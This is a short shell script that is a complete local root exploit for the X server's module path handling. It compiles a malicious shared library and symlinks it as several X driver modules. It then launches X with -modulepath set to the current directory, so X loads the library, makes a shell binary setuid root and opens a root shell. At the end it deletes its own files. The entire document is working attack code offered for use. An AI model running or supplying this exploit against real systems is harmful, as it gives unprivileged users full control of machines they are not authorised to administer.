#!/bin/sh

#Original by Daniel Stone's Advisory and H D Moores sploit.
#Now packed in ONE 25-30 liner shellscript
#bufdaemon@mail.ru

rm -f *.so

echo "#include <stdio.h>" > exploit.c
echo "#include <stdlib.h>" >> exploit.c
cp exploit.c shell.c
echo "void _init(){setreuid(0,0); system(\"chown root shell; chmod 4755 shell\"); exit(0);}" >> exploit.c
echo "int main(int argc,char **argv){char *sh=\"/bin/sh\",*args[2];args[0]=sh;args[1]=NULL;setreuid(0,0);execv(sh,args);}" >> shell.c

gcc -fPIC -c exploit.c
gcc -shared -nostdlib exploit.o -o exploit.so
gcc -o shell shell.c

ln -sf exploit.so libbitmap.so
ln -sf exploit.so bitmap.so
ln -sf exploit.so bitmap_drv.so
ln -sf exploit.so libpcidata.so
ln -sf exploit.so pcidata.so
ln -sf exploit.so pcidata_drv.so

X :3.0 -modulepath `pwd` -nolisten tcp -x bogus
rm exploit.c shell.c 
./shell &&
rm -f bitmap.so bitmap_drv.so exploit.o exploit.so libbitmap.so libpcidata.so pcidata.so pcidata_drv.so shell
